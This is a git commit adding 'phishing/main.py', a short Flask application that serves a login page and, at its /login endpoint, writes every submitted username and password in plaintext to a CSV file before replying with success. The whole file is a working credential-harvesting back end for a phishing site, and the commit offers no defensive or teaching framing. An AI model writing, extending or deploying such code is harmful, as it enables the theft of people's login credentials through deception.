498da6c6748f79b23cb5fd6dd306a1c464b6e7df
Anchit <anchitlahkar0202@gmail.com>
2022-07-26 12:04:29 +0530

    26.07.2022

---
+++ phishing/main.py
@@ -0,0 +1,27 @@
+from flask import Flask, request, url_for, render_template, jsonify, redirect
+import csv
+
+app = Flask(__name__)
+
+
+@app.route("/")
+def index():
+    return render_template("/index.html")
+
+
+@app.route("/login", methods=["POST"])
+def login():
+    username = request.json.get("username")
+    password = request.json.get("password")
+
+    with open("passowrds.csv", "a+")as f:
+        csv_writer = csv.writer(f)
+        csv_writer.writerow([username, password])
+
+    return jsonify({
+        "status": "success"
+    }), 201
+
+
+if __name__ == "__main__":
+    app.run(debug = True)
